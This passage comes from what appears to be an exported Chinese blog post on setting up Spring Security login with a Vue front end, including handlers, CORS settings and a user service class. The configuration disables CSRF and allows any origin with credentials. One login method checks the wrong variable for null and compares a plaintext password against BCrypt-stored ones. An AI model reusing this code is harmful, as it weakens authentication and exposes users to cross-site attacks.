response.setContentType(\"application/json;charset=utf-8\");\n\n        response.setStatus(HttpServletResponse.SC_OK);\n\n        PrintWriter writer = response.getWriter();\n\n        writer.write(JSON.toJSONString(R.ok(REnum.LOGOUT_SUCCESS.getStatusCode(),\n                REnum.LOGOUT_SUCCESS.getStatusMsg())));\n\n        writer.flush();\n    }\n}\n```\n\n#### 403处理器\n```java\npublic class MyAccessDeniedHandler implements AccessDeniedHandler {\n\n\n    @Override\n    public void handle(HttpServletRequest request, HttpServletResponse response, AccessDeniedException accessDeniedException) throws IOException, ServletException {\n\n        response.setContentType(\"application/json;charset=utf-8\");\n\n        response.setStatus(HttpServletResponse.SC_OK);\n\n        PrintWriter writer = response.getWriter();\n\n        writer.write(JSON.toJSONString(R.error(REnum.USER_PERMISSIONS_ERROR.getStatusCode(),\n                REnum.USER_PERMISSIONS_ERROR.getStatusMsg())));\n\n        writer.flush();\n    }\n}\n```\n\n### 跨域\n\n#### 后端\n```java\n@Configuration\npublic class CorsConfig implements WebMvcConfigurer {\n\n    @Override\n    public void addCorsMappings(CorsRegistry registry) {\n        registry.addMapping(\"/**\")\n                .allowedOriginPatterns(\"*\")\n                .allowedMethods(\"GET\", \"HEAD\", \"POST\", \"PUT\", \"DELETE\", \"OPTIONS\")\n                .allowCredentials(true)\n                .maxAge(3600)\n                .allowedHeaders(\"*\");\n    }\n\n}\n```\n\n#### vue(两种方式)\n```shell\naxios.defaults.withCredentials = true # main.js\t\n```\n\n```shell\n# 创建axios实例\nvar instance =  axios.create({\n    baseURL: 'http://localhost:8888/', # 添加基本地址\n    timeout: 1000, # 所有请求在超时前等待1秒\n    withCredentials: true # 请求的时候携带cookie\n})\n```\n\n\n\n\n\n\n\n","slug":"SpringSecurity-vue前后端分离","published":1,"updated":"2023-03-17T08:38:34.252Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clhgy9swl000e0gvg89li2g8v","content":"<p>适合单体架构</p>\n<h2 id=\"基本搭建\"><a href=\"#基本搭建\" class=\"headerlink\" title=\"基本搭建\"></a>基本搭建</h2><p>创建SpringBoot项目并且导入SpringSecurity依赖</p>\n<pre class=\"line-numbers language-pom\" data-language=\"pom\"><code class=\"language-pom\">&lt;dependency&gt;\n    &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;\n    &lt;artifactId&gt;spring-boot-starter-security&lt;&#x2F;artifactId&gt;\n    &lt;version&gt;2.6.8&lt;&#x2F;version&gt;\n&lt;&#x2F;dependency&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>导入图形验证码依赖</p>\n<pre class=\"line-numbers language-pom\" data-language=\"pom\"><code class=\"language-pom\">&lt;dependency&gt;\n    &lt;groupId&gt;com.github.whvcse&lt;&#x2F;groupId&gt;\n    &lt;artifactId&gt;easy-captcha&lt;&#x2F;artifactId&gt;\n    &lt;version&gt;1.6.2&lt;&#x2F;version&gt;\n&lt;&#x2F;dependency&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n<h3 id=\"创建配置类\"><a href=\"#创建配置类\" class=\"headerlink\" title=\"创建配置类\"></a>创建配置类</h3><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token annotation punctuation\">@Configuration</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">SecurityConfigurerAdapter</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">WebSecurityConfigurerAdapter</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">protected</span> <span class=\"token keyword\">void</span> <span class=\"token function\">configure</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">HttpSecurity</span> http<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">&#123;</span>\n        http<span class=\"token punctuation\">.</span><span class=\"token function\">csrf</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">disable</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        http<span class=\"token punctuation\">.</span><span class=\"token function\">cors</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Customizer</span><span class=\"token punctuation\">.</span><span class=\"token function\">withDefaults</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">//解决跨域问题。cors 预检请求放行,让Spring security 放行所有preflight request（cors 预检请求）</span>\n        http<span class=\"token punctuation\">.</span><span class=\"token function\">authorizeRequests</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">requestMatchers</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">CorsUtils</span><span class=\"token operator\">::</span><span class=\"token function\">isPreFlightRequest</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">permitAll</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        http<span class=\"token punctuation\">.</span><span class=\"token function\">formLogin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n                <span class=\"token punctuation\">.</span><span class=\"token function\">failureHandler</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">LoginFailHandler</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n                <span class=\"token punctuation\">.</span><span class=\"token function\">successHandler</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">LoginSuccessHandler</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n                <span class=\"token punctuation\">.</span><span class=\"token function\">loginProcessingUrl</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/user/login\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        http<span class=\"token punctuation\">.</span><span class=\"token function\">authorizeRequests</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n                <span class=\"token punctuation\">.</span><span class=\"token function\">antMatchers</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/user/captcha\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"/user/register\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"/user/alterPwd\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">permitAll</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n                <span class=\"token punctuation\">.</span><span class=\"token function\">anyRequest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">authenticated</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        http<span class=\"token punctuation\">.</span><span class=\"token function\">exceptionHandling</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 自定义权限受限403处理</span>\n\n                <span class=\"token punctuation\">.</span><span class=\"token function\">accessDeniedHandler</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">MyAccessDeniedHandler</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 处理器模式，自由度更广</span>\n\n        <span class=\"token comment\">// .accessDeniedPage(\"/forbidden.html\"); // 直接返回一个页面。不和上面的同时使用</span>\n        \n        http<span class=\"token punctuation\">.</span><span class=\"token function\">logout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">logoutUrl</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/user/logout\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    \n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"实现登录逻辑\"><a href=\"#实现登录逻辑\" class=\"headerlink\" title=\"实现登录逻辑\"></a>实现登录逻辑</h3><p>创建登录逻辑类并实现UserDetailService,重写他的loadUserByUsername方法</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token annotation punctuation\">@Service</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">UserServiceImpl</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">ServiceImpl</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">UserMapper</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">User</span><span class=\"token punctuation\">></span></span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">UserService</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">UserDetailsService</span> <span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token annotation punctuation\">@Autowired</span>\n    <span class=\"token keyword\">private</span> <span class=\"token class-name\">UserRoleService</span> userRoleService<span class=\"token punctuation\">;</span>\n    <span class=\"token annotation punctuation\">@Autowired</span>\n    <span class=\"token keyword\">private</span> <span class=\"token class-name\">RoleService</span> roleService<span class=\"token punctuation\">;</span>\n    <span class=\"token annotation punctuation\">@Autowired</span>\n    <span class=\"token class-name\">BCryptPasswordEncoder</span> passwordEncoder<span class=\"token punctuation\">;</span>\n    <span class=\"token annotation punctuation\">@Autowired</span>\n    <span class=\"token keyword\">private</span> <span class=\"token class-name\">PermissionService</span> permissionService<span class=\"token punctuation\">;</span>\n    <span class=\"token annotation punctuation\">@Autowired</span>\n    <span class=\"token keyword\">private</span> <span class=\"token class-name\">UserPermissionService</span> userPermissionService<span class=\"token punctuation\">;</span>\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">R</span> <span class=\"token function\">getUser</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">User</span> user<span class=\"token punctuation\">,</span> <span class=\"token class-name\">HttpServletRequest</span> request<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">&#123;</span>\n\n        <span class=\"token class-name\">User</span> querUser <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>baseMapper<span class=\"token punctuation\">.</span><span class=\"token function\">selectByUserName</span><span class=\"token punctuation\">(</span>user<span class=\"token punctuation\">.</span><span class=\"token function\">getUsername</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>user <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\n            <span class=\"token keyword\">return</span> <span class=\"token class-name\">R</span><span class=\"token punctuation\">.</span><span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">REnum</span><span class=\"token punctuation\">.</span><span class=\"token constant\">USER_DOES_NOT_EXIST</span><span class=\"token punctuation\">.</span><span class=\"token function\">getStatusCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token class-name\">REnum</span><span class=\"token punctuation\">.</span><span class=\"token constant\">USER_DOES_NOT_EXIST</span><span class=\"token punctuation\">.</span><span class=\"token function\">getStatusMsg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>querUser<span class=\"token punctuation\">.</span><span class=\"token function\">getPassword</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">equals</span><span class=\"token punctuation\">(</span>user<span class=\"token punctuation\">.</span><span class=\"token function\">getPassword</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\n            <span class=\"token keyword\">return</span> <span class=\"token class-name\">R</span><span class=\"token punctuation\">.</span><span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">REnum</span><span class=\"token punctuation\">.</span><span class=\"token constant\">USER_PASSWORD_ERROR</span><span class=\"token punctuation\">.</span><span class=\"token function\">getStatusCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token class-name\">REnum</span><span class=\"token punctuation\">.</span><span class=\"token constant\">USER_PASSWORD_ERROR</span><span class=\"token punctuation\">.</span><span class=\"token function\">getStatusMsg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token punctuation\">&#125;</span>\n        request<span class=\"token punctuation\">.</span><span class=\"token function\">getSession</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">setAttribute</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"user\"</span><span class=\"token punctuation\">,</span> querUser<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">return</span> <span class=\"token class-name\">R</span><span class=\"token punctuation\">.</span><span class=\"token function\">ok</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">REnum</span><span class=\"token punctuation\">.</span><span class=\"token constant\">LOGIN_SUCCESS</span><span class=\"token punctuation\">.</span><span class=\"token function\">getStatusCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                <span class=\"token class-name\">REnum</span><span class=\"token punctuation\">.</span><span class=\"token constant\">LOGIN_SUCCESS</span><span class=\"token punctuation\">.</span><span class=\"token function\">getStatusMsg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">List</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">User</span><span class=\"token punctuation\">></span></span> <span class=\"token function\">getUserList</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\n        <span class=\"token class-name\">List</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">User</span><span class=\"token punctuation\">></span></span> userList <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>baseMapper<span class=\"token punctuation\">.</span><span class=\"token function\">selectList</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">return</span> userList<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">PageUtils</span> <span class=\"token function\">getUserPage</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Map</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> params<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\n        <span class=\"token class-name\">IPage</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">User</span><span class=\"token punctuation\">></span></span> page <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">page</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">QueryPage</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">User</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getPage</span><span class=\"token punctuation\">(</span>params<span class=\"token punctuation\">,</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                <span class=\"token keyword\">new</span> <span class=\"token class-name\">LambdaQueryWrapper</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">User</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">like</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">User</span><span class=\"token operator\">::</span><span class=\"token function\">getUsername</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">)</span> params<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"username\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span>  <span class=\"token class-name\">PageUtils</span><span class=\"token punctuation\">(</span>page<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">R</span> <span class=\"token function\">addUser</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">User</span> user<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\n        <span class=\"token class-name\">User</span> queryUser <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>baseMapper<span class=\"token punctuation\">.</span><span class=\"token function\">getUserByUserName</span><span class=\"token punctuation\">(</span>user<span class=\"token punctuation\">.</span><span class=\"token function\">getUsername</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>queryUser <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\n            <span class=\"token keyword\">return</span> <span class=\"token class-name\">R</span><span class=\"token punctuation\">.</span><span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">REnum</span><span class=\"token punctuation\">.</span><span class=\"token constant\">USER_DOES_EXIST</span><span class=\"token punctuation\">.</span><span class=\"token function\">getStatusCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token class-name\">REnum</span><span class=\"token punctuation\">.</span><span class=\"token constant\">USER_DOES_EXIST</span><span class=\"token punctuation\">.</span><span class=\"token function\">getStatusMsg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token punctuation\">&#125;</span>\n\n        <span class=\"token class-name\">String</span> password <span class=\"token operator\">=</span> user<span class=\"token punctuation\">.</span><span class=\"token function\">getPassword</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token class-name\">String</span> encodePassword <span class=\"token operator\">=</span> passwordEncoder<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>password<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        user<span class=\"token punctuation\">.</span><span class=\"token function\">setPassword</span><span class=\"token punctuation\">(</span>encodePassword<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>baseMapper<span class=\"token punctuation\">.</span><span class=\"token function\">insert</span><span class=\"token punctuation\">(</span>user<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">return</span> <span class=\"token class-name\">R</span><span class=\"token punctuation\">.</span><span class=\"token function\">ok</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">REnum</span><span class=\"token punctuation\">.</span><span class=\"token constant\">REGISTER_SUCCESS</span><span class=\"token punctuation\">.</span><span class=\"token function\">getStatusCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                <span class=\"token class-name\">REnum</span><span class=\"token punctuation\">.</span><span class=\"token constant\">REGISTER_SUCCESS</span><span class=\"token punctuation\">.</span><span class=\"token function\">getStatusMsg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">editUser</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">User</span> user<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>baseMapper<span class=\"token punctuation\">.</span><span class=\"token function\">updateById</span><span class=\"token punctuation\">(</span>user<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">deleteUserById</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Long</span> id<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>baseMapper<span class=\"token punctuation\">.</span><span class=\"token function\">deleteById</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token annotation punctuation\">@Transactional</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">R</span> <span class=\"token function\">alterPwdByUserName</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">User</span> user<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\n        <span class=\"token class-name\">User</span> userByUserName <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>baseMapper<span class=\"token punctuation\">.</span><span class=\"token function\">getUserByUserName</span><span class=\"token punctuation\">(</span>user<span class=\"token punctuation\">.</span><span class=\"token function\">getUsername</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>userByUserName <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\n            <span class=\"token keyword\">return</span> <span class=\"token class-name\">R</span><span class=\"token punctuation\">.</span><span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">REnum</span><span class=\"token punctuation\">.</span><span class=\"token constant\">USER_DOES_NOT_EXIST</span><span class=\"token punctuation\">.</span><span class=\"token function\">getStatusCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token class-name\">REnum</span><span class=\"token punctuation\">.</span><span class=\"token constant\">USER_DOES_NOT_EXIST</span><span class=\"token punctuation\">.</span><span class=\"token function\">getStatusMsg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token punctuation\">&#125;</span>\n\n        <span class=\"token class-name\">String</span> password <span class=\"token operator\">=</span> user<span class=\"token punctuation\">.</span><span class=\"token function\">getPassword</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token class-name\">String</span> encodePassword <span class=\"token operator\">=</span> passwordEncoder<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>password<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        user<span class=\"token punctuation\">.</span><span class=\"token function\">setPassword</span><span class=\"token punctuation\">(</span>encodePassword<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>baseMapper<span class=\"token punctuation\">.</span><span class=\"token function\">alterPwdByUserName</span><span class=\"token punctuation\">(</span>user<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">return</span> <span class=\"token class-name\">R</span><span class=\"token punctuation\">.</span><span class=\"token function\">ok</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">REnum</span><span class=\"token punctuation\">.</span><span class=\"token constant\">ALTER_PASSWORD_SUCCESS</span><span class=\"token punctuation\">.</span><span class=\"token function\">getStatusCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                <span class=\"token class-name\">REnum</span><span class=\"token punctuation\">.</span><span class=\"token constant\">ALTER_PASSWORD_SUCCESS</span><span class=\"token punctuation\">.</span><span class=\"token function\">getStatusMsg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">User</span> <span class=\"token function\">selectUserByName</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> username<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\n        <span class=\"token class-name\">User</span> user <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>baseMapper<span class=\"token punctuation\">.</span><span class=\"token function\">getUserByUserName</span><span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">return</span> user<span class=\"token punctuation\">;</span>\n\n    <span class=\"token punctuation\">&#125;</span>\n\n\n    <span class=\"token comment\">// 登录逻辑</span>\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">UserDetails</span> <span class=\"token function\">loadUserByUsername</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> username<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">UsernameNotFoundException</span> <span class=\"token punctuation\">&#123;</span>\n\n        <span class=\"token class-name\">List</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">SimpleGrantedAuthority</span><span class=\"token punctuation\">></span></span> simpleGrantedAuthorities <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ArrayList</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span>\n\n            <span class=\"token class-name\">User</span> user <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>baseMapper<span class=\"token punctuation\">.</span><span class=\"token function\">getUserByUserName</span><span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token comment\">// System.out.println(user);</span>\n\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>user <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\n                <span class=\"token class-name\">List</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Long</span><span class=\"token punctuation\">></span></span> roleIdList <span class=\"token operator\">=</span> userRoleService<span class=\"token punctuation\">.</span><span class=\"token function\">selectByUserId</span><span class=\"token punctuation\">(</span>user<span class=\"token punctuation\">.</span><span class=\"token function\">getId</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n                <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Long</span> roleId 